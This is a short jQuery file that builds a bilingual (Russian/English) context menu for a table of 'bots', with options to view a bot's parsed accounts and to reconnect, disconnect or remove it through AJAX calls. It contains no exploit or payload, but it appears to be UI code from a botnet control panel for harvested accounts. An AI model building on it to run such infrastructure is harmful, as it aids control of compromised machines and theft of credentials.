$(function(){
	// Language
	switch ($('html').attr('lang')){
		case 'ru':
			window.lexicon = {
				'accounts': 'Аккаунты бота',
				'reconnect': 'Переподключиться',
				'disconnect': 'Отключиться',
				'remove': 'Удалить'
				};
			break;
		default: // english fallback
			window.lexicon = {
				'accounts': 'Bot accounts',
				'reconnect': 'Reconnect',
				'disconnect': 'Disconnect',
				'remove': 'Remove'
				};
			break;
		}
	
	// Rules editor: context menu
	var reload = function(){ window.location.reload(); }
	$.contextMenu(window.AJAXcontextMenu({
		lexicon: window.lexicon,
		selector: '#bots-list TBODY tr *', 
		callback: function(key, opt, ajaxSuccess){
			var $tr = $(this).closest('tr');
			var target = window.location + $tr.data('href');
			$.get( target, {'ajax': key}, ajaxSuccess );
			return true;
			},
		items: {
			'accounts': {
					callback: function(key, opt){
						window.open('?m=reports_accparse&list=accs'
							+ $(this).closest('tr').data('href') // &bot=botid
							);
						return true;
						}
					},
			'--1--': '-----',
			'reconnect': {
					ajaxSuccess: reload
					},
			'disconnect': {
					disabled: function(key,opt){ return $(this).closest('tr').hasClass('conn_offline'); },
					ajaxSuccess: reload
					},
			'--2--': '-----',
			'remove':	{
					ajaxSuccess: function(data){ $(this).closest('tr').remove(); }
					}
			}
		}));
	}); 
